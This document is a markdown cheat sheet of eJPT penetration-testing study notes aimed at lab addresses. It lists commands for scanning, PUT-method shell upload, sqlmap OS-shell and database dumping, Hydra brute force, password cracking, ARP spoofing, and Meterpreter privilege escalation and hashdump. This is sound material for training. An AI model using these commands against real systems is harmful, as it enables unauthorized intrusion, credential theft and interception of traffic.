# eJPT notes

## Routing

`ip route add ROUTETO via ROUTEFROM`  


## Enumeration

### whois

`whois site.com`

### Ping sweep

`fping -a -g 10.10.10.0/24 2>/dev/null  
nmap -sn 10.10.10.0/24`

### Nmap

```bash
# OS Detection, no ping
nmap -Pn -O 10.10.10.10

# def scripts, version check
nmap -sC -sV 10.10.10.10

# above + All ports
nmap -sC -sV -p- 10.10.10.10

# UDP version check
nmap -sU -sV 10.10.10.10
```

## Web Pentesting

### Banner Grabbing

```bash
nc -v 10.10.10.10 port
HEAD / HTTP/1.0
```

### OpenSSL for HTTPS services

```bash
openssl s_client -connect 10.10.10.10:443
HEAD / HTTP/1.0
```

### Httprint

`httprint -P0 -h 10.10.10.10 -s /path/to/signaturefile.txt`

### HTTP Verbs

`GET, POST, HEAD, PUT, DELETE, OPTIONS`

### PUT shells

```bash
wc -m shell.php
x shell.php

PUT /shell.php
Content-type: text/html
Content-length: x
```

### Directory and File Scanning

```bash
dirsearch.py -u http://10.10.10.10 -e *
gobuster -u 10.10.10.10 -w /path/to/wordlist.txt
```

### Google-fu

```text
site:
intitle:
inurl:
filetype:
AND, OR, &, |, -
```

### SQLMap

```bash
sqlmap -u http://10.10.10.10 -p parameter
sqlmap -u http://10.10.10.10  --data POSTstring -p parameter
sqlmap -u http://10.10.10.10 --os-shell
sqlmap -u http://10.10.10.10 --dump
```



## Exploitation

### Unshadow

This prepares a file for use with John the Ripper `unshadow passwd shadow > unshadow`

### John The Ripper

`john -wordlist /path/to/wordlist -users=users.txt hashfile`

### Hydra

```bash
hydra -L users.txt -P pass.txt -t 10 10.10.10.10 ssh -s 22
hydra -L users.txt -P pass.txt telnet://10.10.10.10
```

### SMB / SAMBA

```bash
nmblookup -A 10.10.10.10
smbclient -L //10.10.10.10 -N (list shares)
smbclient //10.10.10.10/share -N (mount share)
enum4linux -a 10.10.10.10
```

### ARP spoofing

```text
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i tap0 -t 10.10.10.10 -r 10.10.10.11
```

### Metasploit

```bash
search x
use x
info
show options
show advanced
```

#### Meterpreter

```text
background
sessions -l
sessions -i 1
sysinfo
ifconfig
route
getuid
getsystem
bypassuac
download x /root/
upload x C:\\Windows
shell
use post/windows/gather/hashdump
```

